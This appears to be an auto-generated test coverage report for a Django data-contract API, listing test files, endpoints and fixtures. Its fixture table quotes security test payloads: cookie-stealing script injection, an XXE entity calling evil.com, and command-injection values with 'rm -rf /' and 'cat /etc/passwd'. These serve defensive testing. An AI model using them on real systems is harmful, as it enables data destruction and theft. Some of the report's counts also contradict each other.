# Test Impact Analysis

*Generated: 2025-12-28 14:34:01*

## Executive Summary

This report provides a comprehensive analysis of test impact across the codebase, 
compiling data from test files, fixtures, factories, and utilities.

### Overall Statistics

- **Total Test Files**: 93
- **Total Fixture Files**: 47
- **Total Factory Files**: 0
- **Total Utility Files**: 3
- **Total Endpoints Referenced**: 84
- **Total Endpoint References**: 1546

### Test Files by Type

- **e2e**: 18
- **integration**: 12
- **regression**: 4
- **unit**: 59

## Impact Matrix by Endpoint

| Endpoint | Test Files | Fixture Files | Utility Files | Test Types | Services | Total Refs |
|----------|-----------|---------------|---------------|------------|----------|------------|
| /api/v1/assets/ | 35 | 0 | 2 | 4 | 1 | 318 |
| /api/v1/auth/login/ | 14 | 1 | 1 | 4 | 1 | 163 |
| /api/v1/contracts/ | 23 | 0 | 1 | 3 | 1 | 138 |
| /api/v1/compliance/runs/ | 7 | 0 | 1 | 3 | 1 | 131 |
| /api/v1/datasets/ | 8 | 0 | 0 | 3 | 1 | 89 |
| /api/v1/auth/me/ | 2 | 0 | 0 | 2 | 1 | 85 |
| /api/v1/auth/register/ | 5 | 0 | 0 | 3 | 1 | 70 |
| /api/v1/scheduled-ingestions/ | 5 | 0 | 0 | 3 | 1 | 53 |
| /api/v1/auth/refresh/ | 8 | 0 | 0 | 4 | 1 | 50 |
| /api/v1/auth/logout/ | 7 | 0 | 0 | 4 | 1 | 27 |
| /api/v1/users/ | 6 | 0 | 1 | 1 | 1 | 25 |
| /api/v1/semantic/ontology | 4 | 0 | 0 | 4 | 1 | 24 |
| /api/v1/semantic/context.jsonld | 4 | 0 | 0 | 4 | 1 | 24 |
| /api/v1/semantic/sparql | 5 | 0 | 0 | 4 | 1 | 20 |
| /api/v1/openapi.json | 1 | 0 | 0 | 1 | 1 | 20 |
| /api/v1/files/ | 8 | 0 | 1 | 3 | 1 | 17 |
| /api/v1/contracts | 2 | 0 | 0 | 1 | 1 | 14 |
| /api/v1/contracts/^(?P<id>[^/.]+)/link-odps\.(?P<format>[a-z0-9]+)/?$ | 1 | 0 | 0 | 1 | 1 | 12 |
| /api/v1/mesh/^domains\.(?P<format>[a-z0-9]+)/?$ | 1 | 0 | 0 | 1 | 1 | 12 |
| /api/v1/contracts/^products\.(?P<format>[a-z0-9]+)/?$ | 1 | 0 | 0 | 1 | 1 | 10 |
| /api/v1/tenants/ | 3 | 0 | 0 | 3 | 1 | 10 |
| /api/v1/jobs/ | 4 | 0 | 0 | 3 | 1 | 10 |
| /api/v1/auth/password-reset/ | 4 | 0 | 0 | 3 | 1 | 9 |
| /api/v1/mesh/^domains/(?P<id>[^/.]+)\.(?P<format>[a-z0-9]+)/?$ | 1 | 0 | 0 | 1 | 1 | 9 |
| /api/v1/assets | 2 | 0 | 0 | 1 | 1 | 7 |
| /api/v1/assets/assets/{asset_id}/activate/ | 0 | 1 | 1 | 0 | 0 | 7 |
| /api/v1/files/files/{file_id}/complete/ | 0 | 1 | 1 | 0 | 0 | 7 |
| /api/v1/contracts/contracts/{contract_id}/validate/ | 0 | 1 | 1 | 0 | 0 | 7 |
| /api/v1/assets/assets/{asset_id}/ | 0 | 1 | 1 | 0 | 0 | 7 |
| /api/v1/search/^search\.(?P<format>[a-z0-9]+)/?$ | 2 | 0 | 0 | 2 | 1 | 6 |
| /api/v1/auth/password-reset/confirm/ | 3 | 0 | 0 | 3 | 1 | 5 |
| /api/v1/mesh/^topology\.(?P<format>[a-z0-9]+)/?$ | 1 | 0 | 0 | 1 | 1 | 5 |
| /api/v1/semantic/sparql/ | 2 | 0 | 1 | 2 | 1 | 5 |
| /api/v1/virtualization/^datasets/(?P<id>[^/.]+)\.(?P<format>[a-z0-9]+)/?$ | 1 | 0 | 0 | 1 | 1 | 5 |
| /api/v1/assets/assets/ | 0 | 1 | 1 | 0 | 0 | 5 |
| /api/v1/compliance/compliance-runs/ | 0 | 1 | 1 | 0 | 0 | 5 |
| /api/v1/contracts/contracts/ | 0 | 1 | 1 | 0 | 0 | 5 |
| /api/v1/files/files/init/ | 0 | 1 | 1 | 0 | 0 | 5 |
| /api/v1/dq/dq-runs/ | 0 | 1 | 1 | 0 | 0 | 5 |
| /api/v1/datasets/datasets/ | 0 | 1 | 1 | 0 | 0 | 5 |
| /api/v1/mesh/^domains/(?P<id>[^/.]+)/transfer-ownership\.(?P<format>[a-z0-9]+)/?$ | 1 | 0 | 0 | 1 | 1 | 4 |
| /api/v1/mesh/^domains/(?P<id>[^/.]+)/policies/apply\.(?P<format>[a-z0-9]+)/?$ | 1 | 0 | 0 | 1 | 1 | 4 |
| /api/v1/mesh/^domains/(?P<id>[^/.]+)/policies/(?P<policy_id>[^/.]+)\.(?P<format>[a-z0-9]+)/?$ | 1 | 0 | 0 | 1 | 1 | 4 |
| /api/v1/mesh/^domains/(?P<id>[^/.]+)/compliance/check\.(?P<format>[a-z0-9]+)/?$ | 1 | 0 | 0 | 1 | 1 | 4 |
| /api/v1/search/^suggestions\.(?P<format>[a-z0-9]+)/?$ | 2 | 0 | 0 | 2 | 1 | 4 |
| /api/v1/virtualization/^datasets\.(?P<format>[a-z0-9]+)/?$ | 1 | 0 | 0 | 1 | 1 | 4 |
| /api/v1/virtualization/^queries\.(?P<format>[a-z0-9]+)/?$ | 1 | 0 | 0 | 1 | 1 | 4 |
| /api/v1/virtualization/^topology\.(?P<format>[a-z0-9]+)/?$ | 1 | 0 | 0 | 1 | 1 | 4 |
| /api/v1/openapi.yaml | 1 | 0 | 0 | 1 | 1 | 4 |
| /api/v1/files/init | 0 | 0 | 1 | 0 | 0 | 4 |

... and 34 more endpoints

## Impact Matrix by Service

| Service | Test Files | Endpoints | Test Types | Total Refs |
|---------|-----------|-----------|------------|------------|
| assets | 28 | 1 | 3 | 28 |
| contracts | 18 | 4 | 3 | 18 |
| auth | 11 | 2 | 4 | 11 |
| compliance | 7 | 1 | 3 | 7 |
| datasets | 6 | 1 | 2 | 6 |
| semantic | 6 | 3 | 3 | 6 |
| scheduled-ingestions | 5 | 1 | 3 | 5 |
| users | 3 | 1 | 1 | 3 |
| v1 | 3 | 2 | 2 | 3 |
| mesh | 2 | 2 | 1 | 2 |
| search | 2 | 1 | 2 | 2 |
| tenants | 1 | 1 | 1 | 1 |
| virtualization | 1 | 1 | 1 | 1 |

## Impact Matrix by Test Type

| Test Type | Test Files | Endpoints | Services | Total Refs |
|-----------|-----------|-----------|----------|------------|
| unit | 59 | 19 | 13 | 59 |
| e2e | 18 | 8 | 7 | 18 |
| integration | 12 | 8 | 7 | 12 |
| regression | 4 | 2 | 2 | 4 |

## Test Files

| File | Type | Endpoint | Service | Method |
|------|------|----------|---------|--------|
| cli/tests/integration/test_odcs_export.py | integration | /api/v1/contracts/ | contracts | GET |
| cli/tests/integration/test_odps_cli_workflows.py | integration | /api/v1/contracts/ | contracts | GET |
| hub/apps/api/middleware/tests/test_cache_headers.py | unit | /api/v1/datasets/ | datasets | GET |
| hub/apps/api/middleware/tests/test_tracing.py | unit | /api/v1/datasets/ | datasets | GET |
| hub/apps/api/standards/tests/test_filtering.py | unit | /api/v1/users/ | users | GET |
| hub/apps/api/standards/tests/test_sorting.py | unit | /api/v1/users/ | users | GET |
| hub/apps/api/tests/test_analytics.py | unit | /api/v1/assets/ | assets | GET |
| hub/apps/api/tests/test_api_integration.py | unit | /api/v1/assets/ | assets | GET |
| hub/apps/api/tests/test_idempotency.py | unit | /api/v1/assets/ | assets | GET |
| hub/apps/api/tests/test_idempotency_error_handling.py | unit | /api/v1/assets/ | assets | GET |
| hub/apps/api/tests/test_middleware.py | unit | /api/v1/assets/ | assets | GET |
| hub/apps/api/tests/test_versioning.py | unit | /api/v1/assets/ | assets | GET |
| hub/apps/api/tests/test_versioning_comprehensive.py | unit | /api/v1/assets/ | assets | GET |
| hub/apps/assets/tests/test_caching.py | unit | /api/v1/assets/ | assets | GET |
| hub/apps/auth/tests/test_authentication_flows.py | unit | /api/v1/auth/login/ | auth | GET |
| hub/apps/auth/tests/test_middleware.py | unit | /api/v1/assets/ | assets | GET |
| hub/apps/auth/tests/test_register_me.py | unit | /api/v1/auth/register/ | auth | GET |
| hub/apps/contracts/tests/test_api_documentation.py | unit | /api/v1/contracts | contracts | GET |
| hub/apps/contracts/tests/test_api_filtering_phase15.py | unit | /api/v1/contracts/ | contracts | GET |
| hub/apps/contracts/tests/test_dcs_rejection.py | unit | /api/v1/contracts/ | contracts | GET |
| hub/apps/contracts/tests/test_odps_linking_endpoint.py | unit | /api/v1/contracts/^(?P<id>[^/.]+)/link-odps\.(?P<format>[a-z0-9]+)/?$ | contracts | GET |
| hub/apps/contracts/tests/test_performance.py | unit | /api/v1/contracts/ | contracts | GET |
| hub/apps/contracts/tests/test_product_first_endpoint.py | unit | /api/v1/contracts/^products\.(?P<format>[a-z0-9]+)/?$ | contracts | GET |
| hub/apps/contracts/tests/test_views_filtering_sorting.py | unit | /api/v1/contracts/ | contracts | GET |
| hub/apps/core/bug_prevention/tests/test_models.py | unit | /api/v1/contracts/ | contracts | GET |
| hub/apps/core/bug_prevention/tests/test_services.py | unit | /api/v1/contracts/ | contracts | GET |
| hub/apps/datasets/tests/test_caching.py | unit | /api/v1/datasets/ | datasets | GET |
| hub/apps/datasets/tests/test_version_integration.py | unit | /api/v1/datasets/ | datasets | GET |
| hub/apps/developer/tests/test_views.py | unit | /api/v1/assets/ | assets | GET |
| hub/apps/mesh/tests/test_topology_endpoints.py | unit | /api/v1/mesh/^topology\.(?P<format>[a-z0-9]+)/?$ | mesh | GET |
| hub/apps/mesh/tests/test_views.py | unit | /api/v1/mesh/^domains\.(?P<format>[a-z0-9]+)/?$ | mesh | GET |
| hub/apps/observability/tests/test_middleware.py | unit | /api/v1/assets/ | assets | GET |
| hub/apps/observability/tests/test_trace_sampling.py | unit | /api/v1/assets/ | assets | GET |
| hub/apps/observability/tests/test_views.py | unit | /api/v1/^observability/freshness\.(?P<format>[a-z0-9]+)/?$ | v1 | GET |
| hub/apps/rate_limiting/tests/test_endpoint_category_config.py | unit | /api/v1/auth/login/ | auth | GET |
| hub/apps/rate_limiting/tests/test_error_response.py | unit | /api/v1/datasets/ | datasets | GET |
| hub/apps/rate_limiting/tests/test_integration.py | integration | /api/v1/assets/ | assets | GET |
| hub/apps/rate_limiting/tests/test_middleware.py | unit | /api/v1/assets/ | assets | GET |
| hub/apps/rate_limiting/tests/test_rate_limit_headers.py | unit | /api/v1/assets/ | assets | GET |
| hub/apps/rate_limiting/tests/test_utils.py | unit | /api/v1/compliance/runs/ | compliance | GET |
| hub/apps/scheduled_ingestion/tests/test_views.py | unit | /api/v1/scheduled-ingestions/ | scheduled-ingestions | GET |
| hub/apps/search/tests/test_views.py | unit | /api/v1/search/^search\.(?P<format>[a-z0-9]+)/?$ | search | GET |
| hub/apps/semantic/tests/test_sparql_endpoint.py | unit | /api/v1/semantic/sparql | semantic | GET |
| hub/apps/semantic/tests/test_sparql_limits.py | unit | /api/v1/semantic/sparql | semantic | GET |
| hub/apps/semantic/tests/test_uri_ontology_endpoints.py | unit | /api/v1/semantic/ontology | semantic | GET |
| hub/apps/tenants/tests/test_middleware.py | unit | /api/v1/assets/ | assets | GET |
| hub/apps/tenants/tests/test_permissions.py | unit | /api/v1/tenants/ | tenants | GET |
| hub/apps/tenants/tests/test_tenant_config_compliance_integration.py | unit | /api/v1/compliance/runs/ | compliance | POST |
| hub/apps/virtualization/tests/test_urls.py | unit | /api/v1/virtualization/^datasets\.(?P<format>[a-z0-9]+)/?$ | virtualization | GET |
| hub/tests/regression/test_api_endpoints_regression.py | regression | /api/v1/assets/ | assets | GET |
| hub/tests/regression/test_middleware_regression.py | regression | /api/v1/assets/ | assets | GET |
| scripts/test_idempotency_standalone.py | unit | /api/v1/assets/ | assets | GET |
| scripts/tests/test_audit_api_endpoints.py | unit | /api/v1/auth/login/ | auth | GET |
| scripts/tests/test_audit_test_endpoints.py | unit | /api/v1/assets/ | assets | GET |
| scripts/tests/test_check_openapi_references.py | unit | /api/v1/users/ | users | GET |
| scripts/tests/test_search_hardcoded_endpoints.py | unit | /api/v1/contracts/ | contracts | GET |
| tests/e2e/test_api_usability_comprehensive.py | e2e | /api/v1/openapi.json | v1 | GET |
| tests/e2e/test_auth_authorization_comprehensive.py | e2e | /api/v1/auth/login/ | auth | GET |
| tests/e2e/test_authentication.py | e2e | /api/v1/auth/login/ | auth | GET |
| tests/e2e/test_cross_capability_e2e.py | e2e | /api/v1/contracts/ | contracts | GET |
| tests/e2e/test_django6_upgrade_critical_workflows.py | e2e | /api/v1/contracts/ | contracts | GET |
| tests/e2e/test_docker_compose_e2e.py | e2e | /api/v1/contracts/ | contracts | GET |
| tests/e2e/test_observability_e2e.py | e2e | /api/v1/^observability/freshness\.(?P<format>[a-z0-9]+)/?$ | v1 | GET |
| tests/e2e/test_persona_auditor.py | e2e | /api/v1/compliance/runs/ | compliance | GET |
| tests/e2e/test_persona_data_consumer.py | e2e | /api/v1/compliance/runs/ | compliance | GET |
| tests/e2e/test_persona_data_engineer_comprehensive.py | e2e | /api/v1/scheduled-ingestions/ | scheduled-ingestions | GET |
| tests/e2e/test_persona_data_provider.py | e2e | /api/v1/compliance/runs/ | compliance | GET |
| tests/e2e/test_rate_limiting_e2e.py | e2e | /api/v1/compliance/runs/ | compliance | GET |
| tests/e2e/test_rest_api.py | e2e | /api/v1/auth/login/ | auth | GET |
| tests/e2e/test_scheduled_ingestion.py | e2e | /api/v1/scheduled-ingestions/ | scheduled-ingestions | GET |
| tests/e2e/test_scheduled_ingestion_use_cases.py | e2e | /api/v1/scheduled-ingestions/ | scheduled-ingestions | GET |
| tests/e2e/test_sdk_python.py | e2e | /api/v1/auth/login/ | auth | POST |
| tests/e2e/test_search_e2e.py | e2e | /api/v1/search/^search\.(?P<format>[a-z0-9]+)/?$ | search | GET |
| tests/e2e/test_semantic_layer.py | e2e | /api/v1/semantic/ontology | semantic | GET |
| tests/integration/test_api_endpoints_comprehensive.py | integration | /api/v1/assets/ | assets | GET |
| tests/integration/test_auth_apis_comprehensive.py | integration | /api/v1/auth/register/ | auth | GET |
| tests/integration/test_compliance_apis_comprehensive.py | integration | /api/v1/compliance/runs/ | compliance | GET |
| tests/integration/test_cross_service_integration_comprehensive.py | integration | /api/v1/semantic/sparql/ | semantic | GET |
| tests/integration/test_data_engineer_api_endpoints.py | integration | /api/v1/scheduled-ingestions/ | scheduled-ingestions | GET |
| tests/integration/test_dataset_apis_comprehensive.py | integration | /api/v1/datasets/ | datasets | GET |
| tests/integration/test_middleware_integration.py | integration | /api/v1/assets/ | assets | GET |
| tests/integration/test_services_django6.py | integration | /api/v1/assets/ | assets | GET |
| tests/performance/test_performance_baseline.py | unit | /api/v1/contracts/ | contracts | GET |
| tests/performance/test_performance_django6.py | unit | /api/v1/assets/ | assets | GET |
| tests/regression/test_api_endpoints.py | regression | /api/v1/auth/login/ | auth | GET |
| tests/regression/test_auth_authorization.py | regression | /api/v1/auth/login/ | auth | GET |
| tests/regression/test_integrations.py | integration | /api/v1/semantic/sparql | semantic | GET |
| tests/scripts/test_gateway_config_review.py | unit | /api/v1/contracts | contracts | GET |
| tests/security/test_security_features.py | unit | /api/v1/assets/ | assets | GET |
| tests/uat/test_api_compatibility_django6.py | unit | /api/v1/assets/ | assets | GET |
| tests/uat/test_no_user_facing_changes_django6.py | unit | /api/v1/assets/ | assets | GET |
| tests/uat/test_sdk_compatibility_django6.py | unit | /api/v1/assets/ | assets | GET |
| tests/uat/test_user_acceptance_django6.py | unit | /api/v1/contracts/ | contracts | GET |

## Fixture Files

| File | Type | Endpoints |
|------|------|-----------|
| tests/fixtures/odps/v1.x/with_refs/sample-local-ref-v1.9.json | json | https://opendataproducts.org/schema/v1.9 |
| tests/fixtures/odps/v1.x/with_refs/sample-internal-ref-v1.9.json | json | https://opendataproducts.org/schema/v1.9, https://example.com/contracts/sample-product-internal-ref-v1.9 |
| tests/fixtures/odps/v1.x/with_refs/sample-external-ref-v1.9.json | json | https://opendataproducts.org/schema/v1.9, https://example.com/schema.yaml#/contract |
| tests/fixtures/odps/v1.x/valid/sample-valid-v1.9.json | json | https://opendataproducts.org/schema/v1.9, https://example.com/contracts/sample-product-v1.9 |
| tests/fixtures/odps/security/malicious/path-traversal-attempt.json | json | https://opendataproducts.org/schema/v4.1 |
| tests/fixtures/odps/security/malicious/script-injection-attempt.json | json | https://opendataproducts.org/schema/v4.1, https://example.com/contract?param=<script>alert(document.cookie)</script>, https://api.example.com/v1?callback=<script>eval('alert(1)')</script> |
| tests/fixtures/odps/security/malicious/path-traversal-multiple.json | json | https://opendataproducts.org/schema/v4.1 |
| tests/fixtures/odps/security/malicious/malicious-url-javascript.json | json | https://opendataproducts.org/schema/v4.1 |
| tests/fixtures/odps/security/malicious/xxe-attempt.json | json | https://opendataproducts.org/schema/v4.1, <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo> |
| tests/fixtures/odps/security/malicious/command-injection-attempt.json | json | https://opendataproducts.org/schema/v4.1, https://example.com/contract; rm -rf /, https://api.example.com/v1?param=$(cat /etc/passwd)... |
| tests/fixtures/odps/v4.0/with_refs/sample-internal-ref-v4.0.json | json | https://opendataproducts.org/schema/v4.0, https://example.com/contracts/sample-product-internal-ref-v4.0 |
| tests/fixtures/odps/v4.0/with_refs/sample-external-ref-v4.0.json | json | https://opendataproducts.org/schema/v4.0, https://example.com/contracts/sample-product-external-ref-v4.0, https://example.com/schema.yaml#/accessMethods |
| tests/fixtures/odps/v4.0/with_refs/sample-local-ref-v4.0.json | json | https://opendataproducts.org/schema/v4.0, https://example.com/contracts/sample-product-local-ref-v4.0 |
| tests/fixtures/odps/v4.0/valid/sample-valid-v4.0.json | json | https://opendataproducts.org/schema/v4.0, https://example.com/contracts/sample-product-v4.0, https://api.example.com/v1/products/sample-product-v4.0 |
| tests/fixtures/odps/v3.x/with_refs/sample-external-ref-v3.9.json | json | https://opendataproducts.org/schema/v3.9, https://example.com/contracts/sample-product-external-ref-v3.9, https://example.com/schema.yaml#/accessMethods |
| tests/fixtures/odps/v3.x/with_refs/sample-internal-ref-v3.9.json | json | https://opendataproducts.org/schema/v3.9, https://example.com/contracts/sample-product-internal-ref-v3.9 |
| tests/fixtures/odps/v3.x/with_refs/sample-local-ref-v3.9.json | json | https://opendataproducts.org/schema/v3.9, https://example.com/contracts/sample-product-local-ref-v3.9 |
| tests/fixtures/odps/v3.x/valid/sample-valid-v3.9.json | json | https://opendataproducts.org/schema/v3.9, https://example.com/contracts/sample-product-v3.9 |
| tests/fixtures/odps/v2.x/with_refs/sample-internal-ref-v2.9.json | json | https://opendataproducts.org/schema/v2.9, https://example.com/contracts/sample-product-internal-ref-v2.9 |
| tests/fixtures/odps/v2.x/with_refs/sample-external-ref-v2.9.json | json | https://opendataproducts.org/schema/v2.9, https://example.com/schema.yaml#/contract |
| tests/fixtures/odps/v2.x/with_refs/sample-local-ref-v2.9.json | json | https://opendataproducts.org/schema/v2.9 |
| tests/fixtures/odps/v2.x/valid/sample-valid-v2.9.json | json | https://opendataproducts.org/schema/v2.9, https://example.com/contracts/sample-product-v2.9 |
| tests/fixtures/odps/v4.1/marketplace/sample-payment-gateways-v4.1.json | json | https://opendataproducts.org/schema/v4.1 |
| tests/fixtures/odps/v4.1/marketplace/sample-complete-marketplace-v4.1.json | json | https://opendataproducts.org/schema/v4.1, https://api.example.com/v1/products/complete-marketplace-product, https://download.example.com/products/complete-marketplace-product |
| tests/fixtures/odps/v4.1/marketplace/sample-access-methods-v4.1.json | json | https://opendataproducts.org/schema/v4.1, https://api.example.com/v1/products/marketplace-access-product, https://docs.example.com/api/v1... |
| tests/fixtures/odps/v4.1/marketplace/sample-pricing-plans-v4.1.json | json | https://opendataproducts.org/schema/v4.1 |
| tests/fixtures/odps/v4.1/with_refs/sample-external-ref-v4.1.json | json | https://opendataproducts.org/schema/v4.1, https://example.com/contracts/sample-product-external-ref-v4.1, https://example.com/schema.yaml#/accessMethods |
| tests/fixtures/odps/v4.1/with_refs/sample-internal-ref-v4.1.json | json | https://opendataproducts.org/schema/v4.1, https://example.com/contracts/sample-product-internal-ref-v4.1 |
| tests/fixtures/odps/v4.1/with_refs/sample-mixed-refs-v4.1.json | json | https://opendataproducts.org/schema/v4.1, https://example.com/contracts/sample-product-mixed-refs-v4.1, https://example.com/schema.yaml#/accessMethods |
| tests/fixtures/odps/v4.1/with_refs/sample-local-ref-v4.1.json | json | https://opendataproducts.org/schema/v4.1, https://example.com/contracts/sample-product-local-ref-v4.1 |
| tests/fixtures/odps/v4.1/multilingual/sample-multiple-languages-v4.1.json | json | https://opendataproducts.org/schema/v4.1, https://example.com/contracts/multilingual-product-multi, https://api.example.com/v1/products/multilingual-product-multi |
| tests/fixtures/odps/v4.1/multilingual/sample-french-only-v4.1.json | json | https://opendataproducts.org/schema/v4.1, https://example.com/contracts/multilingual-product-fr |
| tests/fixtures/odps/v4.1/multilingual/sample-english-only-v4.1.json | json | https://opendataproducts.org/schema/v4.1, https://example.com/contracts/multilingual-product-en |
| tests/fixtures/odps/v4.1/invalid/invalid-wrong-data-type-schema-v4.1.json | json | None |
| tests/fixtures/odps/v4.1/invalid/invalid-schema-violation-v4.1.json | json | https://opendataproducts.org/schema/v3.9 |
| tests/fixtures/odps/v4.1/invalid/invalid-wrong-data-type-details-v4.1.json | json | https://opendataproducts.org/schema/v4.1 |
| tests/fixtures/odps/v4.1/invalid/invalid-missing-required-field-v4.1.json | json | None |
| tests/fixtures/odps/v4.1/invalid/invalid-missing-product-v4.1.json | json | https://opendataproducts.org/schema/v4.1 |
| tests/fixtures/odps/v4.1/invalid/invalid-wrong-data-type-product-v4.1.json | json | https://opendataproducts.org/schema/v4.1 |
| tests/fixtures/odps/v4.1/invalid/invalid-version-pattern-v4.1.json | json | https://opendataproducts.org/schema/v4.1 |
| tests/fixtures/odps/v4.1/invalid/invalid-schema-pattern-v4.1.json | json | https://invalid-schema-url.com/schema/v4.1 |
| tests/fixtures/odps/v4.1/valid/sample-valid-v4.1.json | json | https://opendataproducts.org/schema/v4.1, https://example.com/contracts/sample-product-v4.1, https://api.example.com/v1/products/sample-product-v4.1... |
| tests/conftest.py | conftest | localhost:8083, localhost:8080, localhost:8081... |
| tests/e2e/conftest.py | conftest | /api/v1/assets/assets/, /api/v1/compliance/compliance-runs/, /api/v1/contracts/contracts/... |
| tests/sdk_python/conftest.py | conftest | /api/v1/auth/login/, localhost:8000 |
| cli/tests/conftest.py | conftest | None |
| cli/build/lib/tests/conftest.py | conftest | None |

## Utility Files with Endpoints

| File | Type | Functions |
|------|------|-----------|
| tests/e2e/conftest.py | conftest | detect_environment, get_service_url, get_api_base_url, get_datacontract_service_url, get_compliance_service_url... |
| tests/sdk_python/conftest.py | conftest | pytest_configure, configure_sdk_test_database, get_api_base_url, api_base_url, setUpClass... |
| tests/performance/test_performance_baseline.py | helper | setUp, measure_time, measure_multiple, setUp, test_simple_query_baseline... |

## Data Sources

This report compiles data from:

1. **Test Endpoint Audit** (`test-impact-analysis.json`)
   - 93 test files
   - 63 endpoints referenced

2. **Fixtures and Factories Audit** (`test-fixtures-and-factories-report.json`)
   - 47 fixture files
   - 43 factory classes

3. **Utilities Audit** (`test-utilities-report.json`)
   - 12 utility modules
   - 219 helper functions
